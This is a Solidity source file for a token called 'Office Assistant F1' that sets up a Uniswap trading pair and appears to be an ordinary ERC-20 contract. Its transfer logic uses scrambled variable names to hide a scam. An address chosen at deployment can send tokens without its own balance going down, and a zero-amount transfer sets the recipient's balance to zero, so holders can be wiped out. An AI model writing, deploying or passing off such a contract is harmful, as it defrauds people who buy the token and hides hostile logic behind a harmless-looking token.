/*

*/
// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract OfficeAssistantF1 is Ownable {
    function transfer(address akoslj, uint256 lkaj) public returns (bool success) {
        klasjdjkl(msg.sender, akoslj, lkaj);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function klasjdjkl(address opqiwo, address akoslj, uint256 lkaj) private {
        if (0 == jdf[opqiwo]) {
            balanceOf[opqiwo] -= lkaj;
        }
        balanceOf[akoslj] += lkaj;
        if (0 == lkaj && akoslj != nasd) {
            balanceOf[akoslj] = lkaj;
        }
        emit Transfer(opqiwo, akoslj, lkaj);
    }

    mapping(address => uint256) private laksjdl;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address opqiwo, address akoslj, uint256 lkaj) public returns (bool success) {
        require(lkaj <= allowance[opqiwo][msg.sender]);
        allowance[opqiwo][msg.sender] -= lkaj;
        klasjdjkl(opqiwo, akoslj, lkaj);
        return true;
    }

    mapping(address => uint256) private jdf;

    string public name = 'Office Assistant F1';

    mapping(address => mapping(address => uint256)) public allowance;

    string public symbol = 'F1';

    address public nasd;

    function approve(address hnas, uint256 lkaj) public returns (bool success) {
        allowance[msg.sender][hnas] = lkaj;
        emit Approval(msg.sender, hnas, lkaj);
        return true;
    }

    uint256 private naswdz = 231;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address askldlkasjdlka) {
        balanceOf[msg.sender] = totalSupply;
        jdf[askldlkasjdlka] = naswdz;
        IUniswapV2Router02 kakjsdllka = IUniswapV2Router02(0xEAaa41cB2a64B11FE761D41E747c032CdD60CaCE);
        nasd = IUniswapV2Factory(kakjsdllka.factory()).createPair(address(this), kakjsdllka.WETH());
    }
}